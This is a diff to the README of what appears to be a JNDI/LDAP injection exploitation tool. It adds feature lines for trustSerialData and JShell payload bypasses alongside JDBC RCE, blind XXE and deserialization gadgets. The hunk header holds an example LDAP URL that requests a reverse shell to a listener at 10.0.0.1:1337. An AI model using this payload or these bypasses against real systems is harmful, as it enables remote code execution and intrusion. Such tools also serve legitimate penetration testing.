@@ -45,7 +45,9 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
   - JDBC RCE (MySQL/PostgreSQL/H2/Derby)
   - Tomcat Blind XXE
 - LDAP Deserialization (including common gadgets)
-- Customize payload based on Nashorn JS engine
+- Customize JNDI payload based on Nashorn JS engine
+- LDAP trustSerialData Bypass
+- JShell payload Bypass (Nashorn JS Engine Alternative)
 - UTF-8 Overlong Encoding Bypass
 
 ## 📖 Documentation
